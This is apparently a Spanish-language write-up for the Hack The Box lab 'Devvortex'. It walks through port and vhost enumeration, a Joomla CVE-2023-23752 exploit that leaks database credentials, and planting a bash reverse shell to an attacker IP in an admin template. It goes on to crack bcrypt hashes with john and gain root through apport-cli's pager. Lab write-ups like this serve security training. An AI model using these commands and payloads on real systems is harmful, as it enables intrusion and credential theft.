`nmap -p- -vvv --open -sS -n -Pn 10.10.11.242 -oG allPorts`

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<br>

`nmap -p 22,80 -n -Pn -sCV -vvv 10.10.11.242 -oN targeted`

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br>

```bash
nvim /etc/hosts
<ip-victima>    devvortex.htb
```

<br>

`gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20`

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://devvortex.htb
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/12/02 23:19:26 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb (Status: 200) [Size: 23221]
```

<br>

```bash
nvim /etc/hosts
<ip-victima>    devvortex.htb dev.devvortex.htb
```

<br>

wappalyzer

<br>

`gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20`

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/03 00:25:54 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]                                     
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]    
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]  
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]  
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/] 
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/] 
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]       
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]     
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/] 
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]       
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]   
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
```

<br>

[joomscan](https://github.com/OWASP/joomscan)

```bash
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl -u http://dev.devvortex.htb/
```

```bash
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/
```

<br>

[exploit-CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752)
```bash
git clone https://github.com/Acceis/exploit-CVE-2023-23752
cd exploit-CVE-2023-23752
gem install httpx docopt paint
ruby exploit.rb http://dev.devvortex.htb
```

```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

<br>

[http://dev.devvortex.htb/administrator/index.php](http://dev.devvortex.htb/administrator/index.php)

```
user: lewis
password: P4ntherg0t1n5r3c0n##
```

## Reverse shell
Ruta al archivo `login.php`
System -> Templates - Administrator Templates -> Atum Details and Files -> login.php

Agregar el siguiente código al archivo `login.php`
`system('bash -c "bash -i >& /dev/tcp/10.10.14.246/1234 0>&1"');`

Ponerse en escucha en la máquina atacante
`nc -lnvp 1234`

Ingresar a la página `login.php` para que se ejecute el código agregado
[http://dev.devvortex.htb/administrator/templates/atum/login.php](http://dev.devvortex.htb/administrator/templates/atum/login.php)

<br>

```bash
mysql -u lewis --password=P4ntherg0t1n5r3c0n##
show databases;
use joomla;
select username,password from sd4fg_users;
```

```bash
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

<br>

`echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash`
`john --wordlist=/usr/share/wordlists/rockyou.txt hash`

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:06 DONE (2023-12-05 23:51) 0.1443g/s 202.5p/s 202.5c/s 202.5C/s dianita..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<br>

```bash
su logan
tequieromucho
```

<br>

```bash
ls
cat user.txt
```

> [!IMPORTANT]
> User flag: 84681cf877f4aaf8896e58b644bc2561

<br>

`sudo -l`

```bash
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

<be>

## Escalada de privilegios
[fix: Do not run sensible-pager as root if using sudo/pkexec](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)

Chequear en el directorio `/var/crash` si hay algún reporte sino crearlo con `apport-cli`  
`sudo apport-cli -f -P 1620 --save=/var/crash/example.crash`  
Elegir algún puerto de algún servicio corriendo `ps -faux`  

Abrir el reporte y seleccionar la opción `v`
`sudo apport-cli -c /var/crash/example.crash`

Comandos ejecutados como root
```bash
!id
!ls -l /root
!cat /root/root.txt
```

<br>

> [!IMPORTANT]
> Root flag: d0d3956add40e248dec8854d9690a5bc
